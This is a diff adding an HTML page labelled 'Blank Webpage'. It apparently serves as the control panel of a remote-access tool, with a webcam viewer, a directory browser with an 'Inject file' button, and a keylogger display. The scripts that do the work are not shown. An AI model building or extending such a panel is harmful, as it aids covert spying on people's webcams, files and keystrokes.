@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <!--<meta http-equiv="Content-Security-Policy"
+        content="default-src 'self' data: gap: https://fonts.googleapis.com'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' data: content:;">-->
+    <meta name="viewport" content="initial-scale=1, width=device-width">
+    <meta name="description" content="Blank website">
+    <meta name="keywords" content="none;nothing;ect;">
+    <meta name="author" content="Samuel A. Matheson">
+    <meta charset="utf-8">
+
+    <link rel="icon" href="res/img/favico.webp" type="image/webp" sizes="32x32">
+    <link href="https://fonts.googleapis.com/css?family=Lexend+Deca|Roboto&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="res/css/index.css">
+
+    <title>Blank Webpage</title>
+</head>
+
+<body>
+
+    <!-- Webcam controls -->
+    <div class="view" id="webcam_view">
+        <div class="title">Webcam</div>
+        <video autoplay="true" id="webcam_preview"></video>
+        <button id="stop_video" class="video_btn">stop video</button>
+        <button id="start_video" class="video_btn">start video</button>
+    </div>
+
+    <!-- directory controls -->
+    <div class="view" id="directory_view">
+        <div class="title" id="full_path">Directories</div>
+        <div id="back_a_dir" title="go back a directory"></div>
+        <div id="dirbox"></div>
+        <button id="inject_file" class="video_btn">Inject file</button>
+    </div>
+
+    <!-- Keylog controls -->
+    <div class="view" id="keylog_view">
+        <div class="title">Keylogg</div>
+        <div id="keybox"></div>
+    </div>
+
+    <script type="text/javascript" src="res/js/index.js"></script>
+    <script type="text/javascript" src="res/js/goodies.js"></script>
+</body>
+
+</html>
